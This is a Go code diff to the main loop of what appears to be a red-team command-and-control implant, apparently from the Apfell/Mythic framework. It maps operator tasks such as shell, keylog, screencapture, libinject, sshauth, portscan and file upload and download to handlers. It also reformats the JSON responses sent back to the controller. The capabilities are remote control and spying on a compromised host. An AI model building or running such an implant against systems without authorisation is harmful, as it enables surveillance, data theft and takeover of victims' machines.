@@ -44,10 +44,7 @@ const (
 	EXIT_CODE = 0
 )
 
-var (
-	assemblyFetched int = 0
-	taskSlice       []structs.Task
-)
+var taskSlice       []structs.Task
 
 //export RunMain
 func RunMain() {
@@ -99,39 +96,39 @@ func main() {
 	profile.SetApfellID(checkIn.ID)
 
 	tasktypes := map[string]int{
-		"exit":             EXIT_CODE,
-		"shell":            1,
-		"screencapture":    2,
-		"keylog":           3,
-		"download":         4,
-		"upload":           5,
-		"libinject":           6,
-		"ps":               8,
-		"sleep":            9,
-		"cat":              10,
-		"cd":               11,
-		"ls":               12,
-		"python":           13,
-		"jxa":              14,
-		"keys":             15,
-		"triagedirectory":  16,
-		"sshauth":          17,
-		"portscan":         18,
-		"getprivs":         19,
-		"jobs":             21,
-		"jobkill":          22,
-		"cp":               23,
-		"drives":           24,
-		"getuser":          25,
-		"mkdir":            26,
-		"mv":               27,
-		"pwd":              28,
-		"rm":               29,
-		"getenv":           30,
-		"setenv":           31,
-		"unsetenv":         32,
-		"kill":             33,
-		"none":             NONE_CODE,
+		"exit":            EXIT_CODE,
+		"shell":           1,
+		"screencapture":   2,
+		"keylog":          3,
+		"download":        4,
+		"upload":          5,
+		"libinject":       6,
+		"ps":              8,
+		"sleep":           9,
+		"cat":             10,
+		"cd":              11,
+		"ls":              12,
+		"python":          13,
+		"jxa":             14,
+		"keys":            15,
+		"triagedirectory": 16,
+		"sshauth":         17,
+		"portscan":        18,
+		"getprivs":        19,
+		"jobs":            21,
+		"jobkill":         22,
+		"cp":              23,
+		"drives":          24,
+		"getuser":         25,
+		"mkdir":           26,
+		"mv":              27,
+		"pwd":             28,
+		"rm":              29,
+		"getenv":          30,
+		"setenv":          31,
+		"unsetenv":        32,
+		"kill":            33,
+		"none":            NONE_CODE,
 	}
 
 	// Channel used to catch results from tasking threads
@@ -165,7 +162,10 @@ func main() {
 			switch tasktypes[task.Tasks[1].Command] {
 			case EXIT_CODE:
 				// Throw away the response, we don't really need it for anything
-				profile.PostResponse(task.Tasks[1], "Exiting")
+				// TODO: Change this
+				out := `{"user_output":"exiting"}`
+				profile.PostResponse(task.Tasks[1], string(out))
+
 				break LOOP
 			case 1:
 				// Run shell command
@@ -185,7 +185,7 @@ func main() {
 				break
 			case 5:
 				// File upload
-				// TODO: Update for v1.4
+
 				fileDetails := structs.FileUploadParams{}
 				err := json.Unmarshal([]byte(task.Tasks[1].Params), &fileDetails)
 				if err != nil {
@@ -194,21 +194,15 @@ func main() {
 				}
 
 				result := profile.GetFile(fileDetails)
-				var out = `{}`
+				out := `{}`
 				if result {
 					out = `{"user_output":"file upload successful"}`
 				} else {
 					out = `{"user_output":"file upload failed"}`
 				}
 
-				resultMsg := structs.TaskResponseMessage{}
-				resultSubMsg := structs.Response{}
-				resultSubMsg.Response = []byte(out)
-				resultSubMsg.TaskID = task.Tasks[1].TaskID
-				resultMsg.Responses = append(resultMsg.Responses, resultSubMsg)
 
-				msg, _ := json.Marshal(resultMsg)
-				profile.PostResponse(task.Tasks[1], string(msg))
+				profile.PostResponse(task.Tasks[1], string(out))
 				break
 
 			case 6:
@@ -226,7 +220,10 @@ func main() {
 				}
 
 				profile.SetSleepInterval(i)
-				profile.PostResponse(task.Tasks[1], "Sleep Updated..")
+				// TODO: Change this
+				out := `{"user_output":"sleep updated"}`
+				profile.PostResponse(task.Tasks[1], string(out))
+
 				break
 			case 10:
 				//Cat a file
@@ -236,12 +233,21 @@ func main() {
 				//Change cwd
 				err := os.Chdir(task.Tasks[1].Params)
 				if err != nil {
-					profile.PostResponse(task.Tasks[1], err.Error())
+					out := map[string]interface{}{
+						"user_output": err.Error(),
+					}
+					encOut, _ := json.Marshal(out)
+					profile.PostResponse(task.Tasks[1], string(encOut))
+
 					break
 				}
 
-				
-				profile.PostResponse(task.Tasks[1], fmt.Sprintf("changed directory to: %s", task.Tasks[1].Params))
+				// TODO: Change this
+				out := map[string]interface{}{
+					"user_output": fmt.Sprintf("changed directory to: %s", task.Tasks[1].Params),
+				}
+				encOut, _ := json.Marshal(out)
+				profile.PostResponse(task.Tasks[1], string(encOut))
 				break
 			case 12:
 				//List directory contents
@@ -375,7 +381,11 @@ func main() {
 				if strings.Contains(toApfell.TaskItem.Command, "screencapture") {
 					profile.SendFileChunks(toApfell.TaskItem, toApfell.TaskResult)
 				} else {
-					profile.PostResponse(toApfell.TaskItem, string(toApfell.TaskResult))
+					out := map[string]interface{}{
+						"user_output": string(toApfell.TaskResult),
+					}
+					encOut, _ := json.Marshal(out)
+					profile.PostResponse(toApfell.TaskItem, string(encOut))
 				}
 			case <-time.After(1 * time.Second):
 				break
